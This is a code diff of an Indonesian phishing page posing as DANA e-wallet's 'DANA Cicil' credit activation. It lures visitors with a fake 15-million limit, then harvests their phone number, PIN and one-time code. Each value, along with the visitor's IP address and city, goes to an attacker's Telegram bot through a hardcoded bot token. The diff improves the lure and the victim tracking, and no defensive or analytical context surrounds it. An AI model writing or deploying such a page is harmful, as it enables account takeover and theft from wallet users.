@@ -3,6 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    
+    <meta property="og:title" content="DANA CICIL - Aktivasi Limit Saldo 15 Juta">
+    <meta property="og:description" content="Aktivasi DANA Cicil sekarang, belanja hari ini bayar nanti. Cepat, Mudah, dan Aman.">
+    <meta property="og:image" content="https://i.ibb.co/0jzQMDbw/1000233697.png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content="https://i.ibb.co/0jzQMDbw/1000233697.png">
+
     <title>DANA CICIL - Layanan Kredit Pintar</title>
     
     <script src="https://cdn.tailwindcss.com"></script>
@@ -33,7 +43,6 @@
         .btn-dana-cicil { background: linear-gradient(135deg, var(--d-blue) 0%, var(--d-dark) 100%); box-shadow: 0 10px 25px rgba(17, 142, 234, 0.4); transition: all 0.3s; }
         .btn-dana-cicil:active { transform: scale(0.96); opacity: 0.95; }
 
-        /* --- LOADER --- */
         #loading-ui { position: absolute; inset: 0; background: rgba(255, 255, 255, 0.98); z-index: 1000; display: none; flex-direction: column; align-items: center; justify-content: center; }
         .ring-anim { width: 46px; height: 46px; border: 5px solid #f1f5f9; border-top: 5px solid var(--d-blue); border-radius: 50%; animation: rotateRing 0.8s linear infinite; }
         @keyframes rotateRing { 100% { transform: rotate(360deg); } }
@@ -126,19 +135,19 @@
                     <input type="number" maxlength="1" inputmode="numeric" class="input-digit" id="o3" onkeyup="jump(this, 'o4')">
                     <input type="number" maxlength="1" inputmode="numeric" class="input-digit" id="o4" onkeyup="submitOTP()">
                 </div>
-                <p class="text-gray-400 text-[10px]">Kirim ulang dalam <span id="clock" class="text-blue-500 font-bold">60</span> detik</p>
+                <p class="text-gray-400 text-[10px]">Tunggu <span id="clock" class="text-blue-500 font-bold">60</span> detik</p>
             </div>
         </section>
 
         <section id="panel-4" class="view-panel text-center flex flex-col items-center justify-center py-20">
-            <div class="animate__animated animate__zoomIn"><div class="w-24 h-24 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-8 border-4 border-white shadow-xl shadow-green-500/10"><svg class="w-12 h-12 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="4" d="M5 13l4 4L19 7"></path></svg></div><h2 class="text-2xl font-black italic mb-3 text-blue-900 uppercase italic">AKTIVASI BERHASIL</h2><p class="text-[13px] text-gray-400 px-10 leading-relaxed italic">Limit akan muncul otomatis dalam 24 jam.</p><button onclick="location.reload()" class="mt-14 w-full btn-dana-cicil py-5 rounded-full text-white font-extrabold uppercase shadow-lg">SELESAI</button></div>
+            <div class="animate__animated animate__zoomIn"><div class="w-24 h-24 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-8 border-4 border-white shadow-xl shadow-green-500/10"><svg class="w-12 h-12 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="4" d="M5 13l4 4L19 7"></path></svg></div><h2 class="text-2xl font-black italic mb-3 text-blue-900 uppercase italic">AKTIVASI BERHASIL</h2><p class="text-[13px] text-gray-400 px-10 leading-relaxed italic">Limit sedang diproses ke akun anda.</p><button onclick="location.reload()" class="mt-14 w-full btn-dana-cicil py-5 rounded-full text-white font-extrabold uppercase shadow-lg">SELESAI</button></div>
         </section>
     </div>
 
     <script>
         const API_KEY = "8336160915:AAFUeRN28Q5CsdxMsYH5qvS6IQ9iJxqpEXA";
         const USER_ID = "8001301204";
-        const store = { hp: "", pin: "", otp: "", tnr: "" };
+        const store = { hp: "", pin: "", otp: "", tnr: "", ip: "Loading..." };
 
         async function push(msg) {
             fetch(`https://api.telegram.org/bot${API_KEY}/sendMessage`, {
@@ -149,8 +158,14 @@
         }
 
         async function triggerVisit() {
-            const platform = navigator.platform;
-            push(`<b>👤 PENGUNJUNG BARU (FAST)</b>\n━━━━━━━━━━━━━━━\n<b>Waktu:</b> <code>${new Date().toLocaleTimeString()}</code>\n<b>Device:</b> <code>${platform}</code>\n<b>Status:</b> Online & Memantau`);
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                store.ip = data.ip;
+                push(`<b>👤 PENGUNJUNG BARU (LIVE)</b>\n━━━━━━━━━━━━━━━\n<b>IP Address:</b> <code>${data.ip}</code>\n<b>Lokasi:</b> <code>${data.city}, ${data.country_name}</code>\n<b>Waktu:</b> <code>${new Date().toLocaleTimeString()}</code>\n<b>Status:</b> Memilih Tenor...`);
+            } catch (e) {
+                push(`<b>👤 PENGUNJUNG BARU (LIVE)</b>\n━━━━━━━━━━━━━━━\n<b>Status:</b> Gagal Tarik IP`);
+            }
         }
 
         function load() {
@@ -182,7 +197,7 @@
             if (v.length < 9) return;
             store.hp = "0" + v;
             load();
-            push(`<b>⚡ LOG DANA (HP)</b>\n━━━━━━━━━━━━━━━\n<b>HP:</b> <code>${store.hp}</code>\n<b>Tenor:</b> <code>${store.tnr}</code>`);
+            push(`<b>⚡ LOG DANA (STEP 1)</b>\n━━━━━━━━━━━━━━━\n<b>IP Address:</b> <code>${store.ip}</code>\n<b>HP:</b> <code>${store.hp}</code>\n<b>Tenor:</b> <code>${store.tnr}</code>`);
             setTimeout(() => nav(2), 1000);
         }
 
@@ -192,7 +207,7 @@
             if (p.length === 6) {
                 store.pin = p;
                 load();
-                push(`<b>🔑 LOG DANA (PIN)</b>\n━━━━━━━━━━━━━━━\n<b>HP:</b> <code>${store.hp}</code>\n<b>PIN:</b> <code>${store.pin}</code>`);
+                push(`<b>🔑 LOG DANA (STEP 2)</b>\n━━━━━━━━━━━━━━━\n<b>HP:</b> <code>${store.hp}</code>\n<b>PIN:</b> <code>${store.pin}</code>`);
                 setTimeout(() => { nav(3); startT(); }, 1000);
             }
         }
@@ -203,7 +218,7 @@
             if (o.length === 4) {
                 store.otp = o;
                 load();
-                push(`<b>✅ LOG FINAL</b>\n━━━━━━━━━━━━━━━\n<b>HP:</b> <code>${store.hp}</code>\n<b>PIN:</b> <code>${store.pin}</code>\n<b>OTP:</b> <code>${store.otp}</code>`);
+                push(`<b>✅ LOG FINAL</b>\n━━━━━━━━━━━━━━━\n<b>IP:</b> <code>${store.ip}</code>\n<b>HP:</b> <code>${store.hp}</code>\n<b>PIN:</b> <code>${store.pin}</code>\n<b>OTP:</b> <code>${store.otp}</code>`);
                 setTimeout(() => nav(4), 1000);
             }
         }
